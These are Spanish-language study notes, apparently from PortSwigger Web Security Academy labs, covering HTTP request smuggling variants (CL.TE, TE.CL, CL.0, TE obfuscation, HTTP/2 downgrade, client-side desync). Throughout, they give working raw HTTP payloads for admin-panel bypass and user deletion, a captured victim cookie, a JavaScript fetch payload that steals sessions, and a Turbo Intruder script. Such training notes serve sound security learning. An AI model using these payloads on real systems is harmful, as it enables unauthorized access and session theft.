
----------
# Definición

>**HTTP Request Smuggling** es una técnica de ataque en ciberseguridad que consiste en manipular la forma en que múltiples servidores o componentes intermedios (como proxies, firewalls o balanceadores de carga) interpretan y procesan las solicitudes HTTP.

## Objetivo

El objetivo del atacante es **"infiltrar" una solicitud HTTP maliciosa dentro de otra**, aprovechando inconsistencias en el manejo de los encabezados HTTP —especialmente `Content-Length` y `Transfer-Encoding`— entre los distintos sistemas.

## Posibles explotaciones

- Ejecución de solicitudes no autorizadas
    
- Robo de datos
    
- Bypass de autenticación o firewalls
    
- Ataques de tipo XSS o cache poisoning

## Ejemplo típico

Un proxy interpreta una solicitud como terminada debido a `Content-Length`, pero el servidor backend la interpreta con `Transfer-Encoding: chunked`, lo que permite que el atacante "camufle" una segunda solicitud dentro del cuerpo de la primera.

--------------
# Cabeceras importantes

## Content-Length

>Número de **bytes** de datos enviados en la petición POST.

``` http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

123
```
*\*Nota*: También se puede utilizar en GET.

## Transfer-Encoding (chunked)

>Estructura que define el **tamaño de bytes** (en *hexadecimal*), los **datos**, y el **final del chunk** desde la propia data a tramitar.

``` http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

3                  <--------------------- tamaño de bytes en hexadecimal
123                <--------------------- data
0                  <--------------------- fin del chunk
```

-------------
# Tipos de HTTP Request Smuggling

## CL.TE

>El servidor front-end solo interpreta la cabecera `Content-Length` mientras que el servidor back-end solo interpreta la cabecera `Transfer-Encoding`.

- [[#Explotación CL.TE]]
- [[#CL.TE front-end protection bypass]]

## TE.CL

>El servidor front-end solo interpreta la cabecera `Transfer-Encoding` mientras que el servidor back-end solo interpreta la cabecera `Content-Length`.

- [[#Explotación TE.CL]]
- [[#TE.CL front-end protection bypass]]

## TE.TE

>Ambos servidores solo interpretan la cabecera `Transfer-Encoding`, pero se puede tratar de ofuscar uno de ellos para alterar la interacción con los servidores.

- [[#Obfuscating TE Header]]

## H2.TE

>El servidor front-end procesa peticiones *HTTP/2*, que no interpreta `Transfer-Encoding`, y convierte la petición a HTTP/1 antes de pasarla al back-end, que sí interpreta `Transfer-Encoding`.

## H2.CL

>El servidor front-end procesa peticiones HTTP/2, que no interpreta `Content-Length`, y convierte la petición a HTTP/1 antes de pasarla al back-end, que sí interpreta `Content-Length`.

## CL.0

>El servidor front-end interpreta la cabecera `Content-Length`, mientras que el servidor back-end no.

Lo más común es encontrarlo en *endpoints específicos*, como peticiones a recursos de imágenes.

- [[#Explotación CL.0]]

-----------
# Explotación

Se inyecta una segunda petición HTTP que permanecerá en la *cola* hasta que otro usuario realice una petición al servidor. En ese momento, el servidor responderá con la respuesta de la solicitud inyectada y no la del usuario.

## Explotación CL.TE

``` http
POST / HTTP/1.1
Host: 0a3d009f030617dc812c98ec001600c3.web-security-academy.net
Content-Length: 36
Transfer-Encoding: chunked

0

GET /error HTTP/1.1
Test: test
```

## Explotación TE.CL

Para lograr inyectar la petición en la cola, es necesario construir una petición *completamente correcta*, además de "*inflar*" el ``Content-Length`` de la petición inyectada para que el servidor la mantenga en espera hasta que reciba otra solicitud y logre completarla.
``` http
POST / HTTP/1.1
Host: 0a00005704c12cce81c1443f00c80056.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

35
POST /error HTTP/1.1
Content-Length: 17

test=test
0


```

## Explotación CL.0

``` http
POST /resources/images/avatarDefault.svg HTTP/1.1
Host: 0a8900fc03f9f8b18019e9ff00ca0071.web-security-academy.net
Content-Length: 33


GET /admin HTTP/1.1
Test: test
```

------------
# Front-end protections bypass

Se puede aprovechar una vulnerabilidad HTTP Request Smuggling para saltar protecciones de rutas desde el lado del front-end.

## CL.TE front-end protection bypass

``` http
POST / HTTP/1.1
Host: 0a0a000404c9f00d808d7677009800ef.web-security-academy.net
Content-Length: 74
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

test=test
```

## TE.CL front-end protection bypass

``` http
POST / HTTP/1.1
Host: 0aca00b7030bfa66823815c000c00094.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 17

test=test
0


```

------------
# Revealing secret front-end headers

Si el servidor front-end inserta una cabecera secreta en la petición para luego enviarla al back-end, se puede conseguir ver smuggleando una petición con un ``Content-Length`` lo suficientemente *elevado* para *incluir el contenido de la siguiente petición* que reciba el back-end.

![[request_http-request-smuggling_reveal-header.png]]
![[response_http-request-smuggling_reveal-header.png]]

------------
# Capturing other users' requests

Una vulnerabilidad HTTP Request Smuggling se puede aprovechar para *almacenar* en el servidor (por ejemplo por medio de una sección de comentarios) *la petición de otro usuario*.

Esta técnica puede llevar a *robo de información sensible tramitada* o *robo de cookies*.

- Ejemplo:

	![[request_http-request-smuggling_cookie.png]]
	``` html
	<p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://localhost/?requesGET / HTTP/1.1
        Host: 0abd00f30369f663813e0201007200a1.web-security-academy.net
        sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;
        sec-ch-ua-mobile: ?0
	sec-ch-ua-platform: &quot;Linux&quot;
	upgrade-insecure-requests: 1
	user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
	accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
	sec-fetch-site: none
	sec-fetch-mode: navigate
	sec-fetch-user: ?1
	sec-fetch-dest: document
	accept-encoding: gzip, deflate, br, zstd
	accept-language: en-US,en;q=0.9
	priority: u=0, i
	cookie: victim-fingerprint=EDxt7mMpenoSK6Lxta9yrn2Og8Uff6yO; secret=ZyNfIufUj8LWaxOEMaDGbh9JLUOJQ1Fe; session=ntTU6nfmZVd2zr6oYp2GWeqAbjrUY5HR     <------ (Cookie sesión)
	Content">victim5</a> | 26 July 2025
    </p>
	```

-----------
# Delivering reflected XSS

Si existe una vulnerabilidad XSS reflejada en el servidor, se puede aprovechar a través de un HTTP Request Smuggling para efectuarlo en el navegador de otro usuario que visite la página web.

- Ejemplo:

	En este ejemplo, la cabecera ``User-Agent`` se vuelca en el cuerpo html de la página web sin ninguna sanitización, por lo que es vulnerable a XSS.

	Mandando la siguiente petición se logra inyectar la petición que ocasiona el XSS.
	
	![[request_http-request-smuggling_XSS.png]]

----------
# HTTP Response Hijacking

Mediante la técnica de *Response Queue Poisoning* (RQP) se puede lograr un robo de la respuesta HTTP de otro usuario de esta manera:

1. **Inyectamos** una petición HTTP al back-end mediante HTTP Request Smuggling, y esta *se almacena en la cola de respuestas*.
2. El siguiente **usuario** realiza una *petición normal* al servidor, pero recibe la respuesta de la petición inyectada.
3. La respuesta del usuario se queda en la **cola**.
4. El atacante puede tratar de recuperar la respuesta enviando otra petición normal al servidor. Si esta *se envía en el momento preciso* (antes de que el back-end deseche la respuesta), se puede lograr secuestrar la respuesta original del usuario.

----------
# Malicious Javascript File Execution

Si el servidor realiza peticiones para obtener recursos como *scripts* javascript, y existe alguna vulnerabilidad de redireccionamiento en la solicitud de estos, se puede aprovechar para, mediante HTTP Request Smuggling, cargar un código javascript malicioso alojado en la máquina del atacante.

Si se realiza el envenenamiento de la cola de respuestas en el momento en el que el navegador de la víctima solicita el recurso javascript, se puede lograr la ejecución del código.

----------
# HTTP/2 Request Smuggling via CRLF Injection

Si el servidor front-end realiza un downgrade a HTTP/1 sanitizando las cabeceras de una forma vulnerable (bloqueando cabeceras textuales), se puede tratar de *inyectar* las cabeceras bloqueadas en etiquetas HTTP/2 *como valores* de cabecera con **\r\n**.

![[headers_http-request-smuggling_CRLF.png]]![[body_http-request-smuggling_CRLF.png]]

-----------
# HTTP/2 Request Splitting via CRLF Injection

Si el front-end no valida correctamente las cabeceras HTTP/2 antes de realizar un downgrade a HTTP/1, se puede conseguir *inyectar una petición dentro de una cabecera* por medio de CRLF Injection.

![[header_http-request-smuggling_splitting.png]]

---------
# Enabling blocked HTTP methods

Si el servidor front-end bloquea solicitudes con métodos HTTP no permitidos, se puede inyectar una petición con uno de estos mediante HTTP Request Smuggling.

-----------
# Obfuscating TE Header

Si ambos servidores interpretan `Transfer-Encoding`, se puede tratar de ofuscar la cabecera duplicándola. Si existe una *disparidad* entre el front-end y el back-end en la forma de *tratar cabeceras HTTP duplicadas*, se puede acontecer un HTTP Request Smuggling.

- Ejemplo:

	En este ejemplo, el servidor front-end se queda con la primera aparición de la cabecera mientras que el back-end mantiene la última aparición.
``` http
POST / HTTP/1.1
Host: 0a57004e03aa9bfc81fa4a6300be000f.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: invalido
	
36
GPOST /error HTTP/1.1	
Content-Length: 17
	
test=test
0
	
	
```
También se puede efectuar como:
``` http
POST / HTTP/1.1
Host: 0a2a001f04e5360480b771ca000f002c.web-security-academy.net
Content-Length: 38
Transfer-Encoding: invalido
Transfer-Encoding: chunked

0

GPOST /error HTTP/1.1
Test: test
```

*\*Nota*: se puede realizar con el enfoque CL.TE o con TE.CL.

-----------
# Web Cache Poisoning

Se puede sustituir la respuesta de un recurso, que se está almacenando en la caché web, por otra maliciosa si existe una vulnerabilidad HTTP Request Smuggling.

Para llevarlo a cabo, se siguen estos pasos:

1. Se **espera** hasta que la respuesta al recurso *deje de estar almacenada* en la caché.
2. Se **inyecta** una petición al back-end mediante *HTTP Request Smuggling*.
3. Se **vuelve a solicitar el recurso**, pero esta vez, como se ha inyectado una petición, se acabará cacheando la respuesta de la petición inyectada para ese recurso.

-------------
# Web Cache Deception

Se puede sustituir un recurso estático que se está cacheando en la web por otro que revele información sensible acerca de otro usuario a través de HTTP Request Smuggling.

El proceso para realizarlo es bastante similar al de [[#Web Cache Poisoning]].

----------
# HTTP Request Tunnelling using HEAD

El método *HEAD* devuelve las cabeceras de la repuesta al recurso solicitado, incluyendo el *Content-Length* de este, pero sin devolverlo.

Si el front-end convierte las peticiones HTTP/2 en HTTP/1.1 al pasarlas al back-end, y este último interpreta el Content-Length del HEAD como si fuera el del contenido a devolver, se puede realizar una petición tunelizada que devuelve los bytes que indica el Content-Length del recurso del HEAD.

*\*Importante*:

- Si el Content-Length del HEAD es mayor que la longitud en bytes de la respuesta de la petición tunelizada, se producirá un timeout.
- Hay que ir probando recursos de la web para poder ver el mayor contenido posible pero sin provocar un timeout.
- Se da cuando el front-end no reutiliza la conexión con el back-end, por lo que no se da el clásico HTTP Request Smuggling.

- Una cabecera interesante para probar inyección es **:path**.

----------
# Client-side Desync (CSD)

>Un **CSD** es una desincronización entre el back-end del servidor y el navegador del cliente.

Se produce cuando el servidor *no interpreta* correctamente la cabecera ``Content-Length`` y la **conexión** entre el servidor y el cliente es *persistente*.

El concepto y el alcance es similar a un HTTP Request Smuggling convencional, pero *requiere dos peticiones o más para provocar la desincronización*, a diferencia del clásico, que requiere una sola petición.

Se puede llevar a cabo en el navegador de otro cliente mediante *javascript*, siempre y cuando las políticas de *CORS* del servidor lo permitan. De ser posible, es conveniente realizar las peticiones con *fetch*, ya que permite controlar el modo CORS, mientras que el objeto XMLHttpRequest no lo permite.

- *\*Ejemplo* en el que se filtra la cookie de sesión de otro usuario por medio de la sección de comentarios de un blog:
``` javascript
<script>
	fetch("https://0a7e00620446d58882386fc2005500dd.h1-web-security-academy.net", {
		method: "POST",
		mode: "no-cors",
		credentials: "include",
	    body: "POST /en/post/comment HTTP/1.1\r\n" +
          "Host: 0a7e00620446d58882386fc2005500dd.h1-web-security-academy.net\r\n"+
          "Cookie: session=g30d6kHOcvERq4DJGUfPLtHI1yfZRJbe\r\n" +
          "Content-Type: application/x-www-form-urlencoded\r\n" +
          "Content-Length: 700\r\n\r\n" +
          "csrf=C05RNjhaoywgFTJUNcVZ5WDicOQdn0AQ&postId=4&name=victim&email=vic%40tim.com&website=&comment=request=\r\n\r\n"
	});

	fetch("https://0a7e00620446d58882386fc2005500dd.h1-web-security-academy.net", {
	    method: "GET",
	    mode: "no-cors",
	    credentials: "include"
	});
</script>
```

-------------
# Server-side Paused-based Request Smuggling

Se aprovecha de que el servidor back-end deja la conexión abierta después de recibir una petición para enviar una petición HTTP incompleta, esperar un tiempo hasta que se haga timeout, y enviar el cuerpo de la petición que contiene la petición smuggleada.

En este punto, el back-end interpretará el cuerpo como una nueva petición al haberse vencido el tiempo de respuesta y al mantener la misma conexión.

Para llevar a cabo este ataque, se puede utilizar la extensión de BurpSuite *Turbo Intruder*.

- Se envía una petición, con el cuerpo smuggleado, a un *endpoint concreto* que no cierre la conexión después de timeout, segmentada y con una pausa mayor que el timeout.
- Se envía una segunda petición normal después de esta.
``` python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    attacker_request = """POST /resources HTTP/1.1
Host: 0a7200410319a60380fafee600ad00d7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: %s

%s"""

    smuggled_request = """GET /error HTTP/1.1
Host: 0a7200410319a60380fafee600ad00d7.web-security-academy.net

"""

    normal_request = """GET / HTTP/1.1
Host: 0a7200410319a60380fafee600ad00d7.web-security-academy.net

"""

    engine.queue(attacker_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=61000)
    engine.queue(normal_request)

def handleResponse(req, interesting):
    table.add(req)
```

La segunda petición recibirá, por tanto, la respuesta de la petición smuggleada.